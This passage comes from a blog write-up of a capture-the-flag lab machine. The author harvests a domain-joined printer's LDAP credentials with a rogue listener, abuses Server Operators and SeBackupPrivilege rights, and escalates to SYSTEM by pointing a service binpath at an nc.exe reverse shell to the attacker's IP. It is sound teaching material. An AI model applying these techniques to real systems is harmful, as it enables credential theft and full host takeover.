            <button class="copy-button" state="copy" data="%20%20%20%20%20%20%20kali%20in%20~/Desktop/WindowsTools%20%f0%9f%90%8d%20v3.11.9%20%202GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%20%20%20%20%20%20%20%f0%9f%95%99%2011:31:36%20zsh%20%e2%9c%96%20%20python3%20ldapchecker.py%20$box%0a%20%20%20%20%20%20%20Attempting%20to%20connect%20to%2010.129.95.241%20with%20SSL...%0a%20%20%20%20%20%20%20Failed%20to%20connect%20with%20SSL.%20Retrying%20without%20SSL...%0a%20%20%20%20%20%20%20Connected%20successfully.%20Retrieving%20server%20information...%0a%20%20%20%20%20%20%20DSA%20info%20%28from%20DSE%29:%0a%20%20%20%20%20%20%20%20%20%20Supported%20LDAP%20versions:%203,%202%0a%20%20%20%20%20%20%20%20%20%20%20%20Naming%20contexts:%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20DC=return,DC=local%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20CN=Configuration,DC=return,DC=local%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20CN=Schema,CN=Configuration,DC=return,DC=local%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20DC=DomainDnsZones,DC=return,DC=local%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20DC=ForestDnsZones,DC=return,DC=local">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>       kali in ~/Desktop/WindowsTools üêç v3.11.9  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
</span></span><span style="display:flex;"><span>       üïô 11:31:36 zsh ‚úñ  python3 ldapchecker.py $box
</span></span><span style="display:flex;"><span>       Attempting to connect to 10.129.95.241 with SSL...
</span></span><span style="display:flex;"><span>       Failed to connect with SSL. Retrying without SSL...
</span></span><span style="display:flex;"><span>       Connected successfully. Retrieving server information...
</span></span><span style="display:flex;"><span>       DSA info <span style="color:#f92672">(</span>from DSE<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>          Supported LDAP versions: 3, <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>            Naming contexts:
</span></span><span style="display:flex;"><span>              DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>              CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>              CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>              DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>              DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local</span></span></code></pre></div>
    
</div>
</li>
<li>
<p><!-- raw HTML omitted -->We have the domain functionaility level<!-- raw HTML omitted -->:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>       Other:
</span></span><span style="display:flex;"><span>       domainFunctionality:
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>       forestFunctionality:
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>       domainControllerFunctionality:
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>       rootDomainNamingContext:
</span></span><span style="display:flex;"><span>         DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local</span></span></code></pre></div>
    
</div>
<ul>
<li>The functionality level determines the minimum version of Windows server that can be used for a DC.
<ul>
<li>
<p>+Note+: Any host os can be used on <strong>workstations</strong>, however the functionality level determines what the minimum version for DC&rsquo;s and the forest.</p>
</li>
<li>
<p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels</a></p>
</li>
<li>
<p>Knowing the function level is useful as if want to target the DC&rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.</p>
</li>
<li>
<p>In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.</p>
</li>
<li>
<p>Here‚Äôs a list of functional level numbers and their corresponding Windows Server operating systems:</p>
<table>
  <thead>
      <tr>
          <th>Functional Level Number</th>
          <th>Corresponding OS</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>0</td>
          <td>Windows 2000</td>
      </tr>
      <tr>
          <td>1</td>
          <td>Windows Server 2003 Interim</td>
      </tr>
      <tr>
          <td>2</td>
          <td>Windows Server 2003</td>
      </tr>
      <tr>
          <td>3</td>
          <td>Windows Server 2008</td>
      </tr>
      <tr>
          <td>4</td>
          <td>Windows Server 2008 R2</td>
      </tr>
      <tr>
          <td>5</td>
          <td>Windows Server 2012</td>
      </tr>
      <tr>
          <td>6</td>
          <td>Windows Server 2012 R2</td>
      </tr>
      <tr>
          <td>7</td>
          <td>Windows Server 2016</td>
      </tr>
      <tr>
          <td>8</td>
          <td>Windows Server 2019</td>
      </tr>
      <tr>
          <td>9</td>
          <td>Windows Server 2022</td>
      </tr>
  </tbody>
</table>
<ul>
<li>+Note+:
<ul>
<li>Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.</li>
<li>As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><!-- raw HTML omitted -->We have the full server name<!-- raw HTML omitted -->:</p>
<ul>
<li>Again we can see this has the CN as the base (mentioned previously.) So it appears it&rsquo;s a printer server site of some sort. What is also interesting is the CN name &ldquo;Configuration&rdquo;, this could imply that it is still to be configured. Which is interesting as things that are still being configured may not have had thorough security stanards actioned.







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>        serverName:
</span></span><span style="display:flex;"><span>          CN<span style="color:#f92672">=</span>PRINTER,CN<span style="color:#f92672">=</span>Servers,CN<span style="color:#f92672">=</span>Default-First-Site-Name,CN<span style="color:#f92672">=</span>Sites,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span><span style="color:#66d9ef">return</span>,DC<span style="color:#f92672">=</span>local
</span></span><span style="display:flex;"><span>        schemaNamingContext:</span></span></code></pre></div>
    
</div>
</li>
</ul>
</li>
</ol>
</li>
<li>
<p>It&rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.</p>
<ul>
<li>We have the naming context.</li>
<li>Domain name.</li>
<li>But wait there&rsquo;s more‚Ä¶.</li>
</ul>
</li>
</ul>
<h3 id="enumerating-the-webserver-and-getting-a-foothold">Enumerating the Webserver &amp; Getting a foothold:</h3>
<ul>
<li>We can see a webserver running on the host:
<ul>
<li><figure><img src="/ox-hugo/2024-08-31-084657_.png">
</figure>
</li>
</ul>
</li>
<li>This is interesting as it&rsquo;s a domain joined printer and this is the admin/settings page. For this printer to be able to operate and be used on the domain, it will have credentials stored. So we should be able to extract these.</li>
<li>I stand up an nc listener &amp; listen on ldap port <code>389</code>
<ul>
<li><code>sudo nc -lvnp 389</code></li>
<li>I then enter my email address and click &ldquo;Update&rdquo;</li>
<li>I immediately get a connection anda  password is displayed.
<ul>
<li><figure><img src="/ox-hugo/2024-08-31-085401_.png">
</figure>
</li>
</ul>
</li>
<li><!-- raw HTML omitted -->I verify the password is valid using netexec<!-- raw HTML omitted -->:
<ul>
<li><figure><img src="/ox-hugo/2024-08-31-085727_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="ldap-bind-information">Ldap Bind Information:</h4>
<ul>
<li>I had wireshark running at this time to capture any interesting traffic &amp; here we can see the <code>POST</code> request from the server &amp; the subsequent <code>LDAP BIND REQUEST</code> to our malicious server.
<ul>
<li><figure><img src="/ox-hugo/2024-09-01-095413_.png">
</figure>
</li>
<li>We can actually gather a significant amount of information from this packet.
<ol>
<li>The version of LDAP being used.
<ul>
<li>This particular printer is using 2, however the most recent version is 3.</li>
</ul>
</li>
<li>The name of the client/user making the request:
<ul>
<li><code>return\svc-printer</code></li>
</ul>
</li>
<li>The Authentication method:
<ul>
<li><code>(0) Simple</code> aka as clear text passwords.</li>
</ul>
</li>
</ol>
</li>
<li><figure><img src="/ox-hugo/2024-09-01-095817_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="i-connect-to-the-host-via-evil-winrm">I connect to the host via Evil-Winrm:</h3>
<ul>
<li>
<p>I want to be fully transparent here, I didn&rsquo;t go straight to checking evil-winrm and connecting. Instead I messed around with SMB and enumerating the shares, which is not a bad thing but I should have realistically checked for this earlier. I hear you say &ldquo;but why are you telling me this?&rdquo; well, there are a lot of videos and writeups for boxes where people go &ldquo;I did A,B,C &amp; that&rsquo;s how I owned this box in 3 minutes flat&rdquo; but that&rsquo;s not the reality of it, and it sets unrealistic expectations for people. In reality, you try various things and they fail and then you realize you missed something and do that. Granted this will improve with time and methodology however It&rsquo;s not true when you are starting out &amp; that is okay.</p>
</li>
<li>
<p>I connect &amp; check my users privs:</p>
</li>
<li>
<figure><img src="/ox-hugo/2024-08-31-092915_.png">
</figure>

</li>
<li>
<p>I can see that I have the <code>SeBackupPrivilege</code> which effectivley means I have <code>NT AUTHORITY SYSTEM</code>.</p>
</li>
<li>
<p>I check my group membership and can see I am part of the <code>Server Operators</code>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-09-01-100535_.png">
</figure>
</li>
<li>This is a high-privileged group:</li>
</ul>
</li>
<li>
<p>The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges. <strong>It is a very highly privileged group that can log in locally to servers, including Domain Controllers.</strong></p>
<ul>
<li>We get the below capabilites by being part of this group:
<ul>
<li>Interactive sign-in to servers.</li>
<li>Create and delete network shared resources.</li>
<li>Start and stop services.</li>
<li>Back up and restore files.
<ul>
<li>As seen in <code>SeBackupPrivilege</code> &amp; <code>SeRestorePrivilege</code></li>
</ul>
</li>
<li>Format the hard disk drive.</li>
<li>Shut down the computer.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="why-sebackupprivilege-is-dangerous">&ldquo;why <code>SeBackupPrivilege</code>&rdquo; is dangerous:</h4>
<ul>
<li>Here is why <code>SeBackupPrivilege</code> is so dangerous if we control a user who has the privilege:</li>
<li>The privilege will let us copy ANY file from a folder, even if there is no access control entry (ACE) for us in the folder&rsquo;s access control list (ACL)</li>
<li>However, we can&rsquo;t do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea">FILE_FLAG_BACKUP_SEMANTICS</a> flag. E.G. Use Diskshadow.exe
<ul>
<li>Some more fun facts about this privilege:</li>
<li><strong>Members of the</strong> <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#backup-operators">Backup Operators Group</a>  <strong>&amp;</strong> <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators">Server Operators Group</a> <strong>get this privilege by default</strong>:</li>
<li>Provides read access to all files and directories for backup purposes, bypassing standard permissions.
<ul>
<li>Allows a process to read any file, regardless of the file&rsquo;s permissions.</li>
<li>Used primarily for backup applications that need access to all files.</li>
<li>Does not enable writing or deleting files, only reading.</li>
</ul>
</li>
<li>Security Considerations
<ul>
<li>High potential for abuse if granted to unauthorized applications or users.</li>
<li>Should be closely monitored and restricted to trusted applications and personnel.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="path-to-nt-authority-system-course-correction">Path to NT Authority\System course correction:</h3>
<ul>
<li>Inititally I actually went down the path of dumping the registry hives for a <code>SAM</code> attack. As we do not have access to an actual domain controller so a DC Sync/Dumping <code>NTDS.dit</code> attack was no feasible. Just getting NT Locally would be enough to meet our needs. However when performing this attack I was successul in extracting the administrators hash but all pass the hash attacks (PTH) and attempts to login is as the administrator would not work, so the account login must be restricted locally.</li>
<li>So now it&rsquo;s a case of looking at the other capabilites that we have as members of the &ldquo;Server Operators&rdquo; Group, e.g. the ability to start &amp; stop processes.</li>
</ul>
<h3 id="enumerating-services">Enumerating Services:</h3>
<ul>
<li>I try various ways to enumerate the processes &amp; services manually using inbuilt tools in windows, however these are all denied.</li>
<li><strong>Processes</strong>:
<ul>
<li><figure><img src="/ox-hugo/2024-09-01-105215_.png">
</figure>
</li>
</ul>
</li>
<li><strong>Services</strong>:
<ul>
<li><figure><img src="/ox-hugo/2024-09-01-110052_.png">
</figure>
</li>
</ul>
</li>
<li><strong>Trying SharpUp</strong>:
<ul>
<li><figure><img src="/ox-hugo/2024-09-01-110707_.png">
</figure>
</li>
</ul>
</li>
<li><strong>Evil-Winrm</strong>:
<ul>
<li>I didn&rsquo;t know this previously bu as we are using evil-winrm it has the ability to enumerate services that are running by running the <code>services</code> command even if other methods do not work.
<ul>
<li><figure><img src="/ox-hugo/2024-09-01-105457_.png">
</figure>
</li>
<li>Here we can see that the <code>VGAutheService.exe</code> binary is running as a privileged user/NT Authority System and the service name is <code>VGAuthService</code></li>
</ul>
</li>
<li>I tried to enumerate if the service path was modifiable but all my efforts were denied. I am going to attempt to attack it anyway.
<ul>
<li>I was able to query if I could stop it, which I can:
<ul>
<li><figure><img src="/ox-hugo/2024-09-01-120709_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="attacking-the-bin-path-and-getting-system">Attacking the Bin Path &amp; Getting System:</h3>
<ul>
<li>I am going to see if I can modify the binaries path to point to a binary I control, e.g. NC or a reverse shell. I will then stop the service &amp; restart it again. As the service runs as NT Authority\System it should run my binary with elevate privileges.
<ul>
<li>+Note+: Sometimes this is what it is, trying until we find the right route.</li>
</ul>
</li>
</ul>
<ol>
<li><strong>Upload my binary, nc.exe</strong>
<ul>
<li><figure><img src="/ox-hugo/2024-09-01-120741_.png">
</figure>
</li>
</ul>
</li>
<li><strong>Stand up my listener</strong>:
<ul>
<li><figure><img src="/ox-hugo/2024-09-01-120402_.png">
</figure>
</li>
</ul>
</li>
<li><strong>Stop the process &amp; ensure it has stopped</strong>:
<ul>
<li><figure><img src="/ox-hugo/2024-09-01-120824_.png">
</figure>
</li>
</ul>
</li>
<li><strong>Modify the binary path to have cmd execute my nc.exe binary and connect back to my attack host</strong>:
<ul>
<li><figure><img src="/ox-hugo/2024-09-01-120912_.png">
</figure>
</li>
<li><em><strong>Explained</strong></em>:
<ul>
<li>Initially I did just have the binpath be:
<ul>
<li><code>sc.exe config VGAuthService binpath=&quot;C:\Users\svc-printer\Documents\nc.exe -e cmd 10.10.14.131 9999&quot;</code></li>
<li>However it kept failing. After doing some digging I found out why.
<ul>
<li>If we start a service process it <strong>will</strong> fail if the service <strong>MUST</strong> is not a Windows Service; which means the reverse shell will fail. Instead if we have cmd launch and then run our reverse shell even if the service fails our reverse shell will persist as it will be backgrounded.</li>
<li>Information here: <a href="https://learn.microsoft.com/en-gb/windows/win32/api/winsvc/nc-winsvc-lpservice_main_functiona?redirectedfrom=MSDN">https://learn.microsoft.com/en-gb/windows/win32/api/winsvc/nc-winsvc-lpservice_main_functiona?redirectedfrom=MSDN</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Start the process:
<ul>
<li><figure><img src="/ox-hugo/2024-09-01-120942_.png">
</figure>
</li>
</ul>
</li>
<li>Profit
<ul>
<li><figure><img src="/ox-hugo/2024-09-01-121010_.png">
</figure>
</li>
<li><figure><img src="/ox-hugo/2024-09-01-121248_.png">
</figure>
</li>
</ul>
</li>
</ol>
<h2 id="lessons-learned">Lessons Learned:</h2>
<h3 id="what-did-i-learn">What did I learn?</h3>
<ol>
<li>I learned how to extract hardcoded LDAP credentials from hosts by using a malicious LDAP server.</li>
<li>I learned that we can enumerate running services using evil-winrm.</li>
<li>I learned that if we modify a service to run a custom binary it will fail unless we execute it using cmd as services will fail if they are not a Windows Service.
<ul>
<li>Information here: <a href="https://learn.microsoft.com/en-gb/windows/win32/api/winsvc/nc-winsvc-lpservice_main_functiona?redirectedfrom=MSDN">https://learn.microsoft.com/en-gb/windows/win32/api/winsvc/nc-winsvc-lpservice_main_functiona?redirectedfrom=MSDN</a></li>
</ul>
</li>
</ol>
<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
<ol>
<li>I did not try and connect with Evil-Winrm sooner, this isn&rsquo;t a terrible mistake as I was acively enumerating SMB but it is low hangin fruit that I could have seen sooner.</li>
<li>I initially went after a local admin account, however this was not the right path to take.</li>
</ol>
<h2 id="sign-off">Sign off:</h2>
<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
<p>Until next time, hack the planet!</p>
<p>‚Äì Bloodstiller</p>
<p>‚Äì Get in touch bloodstiller at proton dot me</p>

            
        </div>
    </article>

        </main>

        <footer class="footer">
    <div class="footer-left">
        <ul class="social">
            
                <li>All Rights Reserved ¬Æ.</li>
            

            
                <li>Bloodstiller</li>
            

            
                
            
                
            
                
                    <li>
                        
                            <a href="https://github.com/bloodstiller" target="_blank">
                                <i class="bi-github"></i>
                            </a>
                        

                    </li>
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
        </ul>
    </div>

    <div class="footer-right">
        <ul class="control status clearfix">
            
                <li>
                    
                        Word Count:
                        2395
                    
                </li>
            


            
                <li>en</li>
            

            

            

            
                <li>
                    
                        Last modified: &nbsp;
                        <time>
                            Sep 01 2024 00:00:00
                        </time>
                    
                </li>
            

            
        </ul>
    </div>
</footer>

    </body>

    






















    
        
        <script
            type="text/javascript"
            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
    















<link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />




</html>
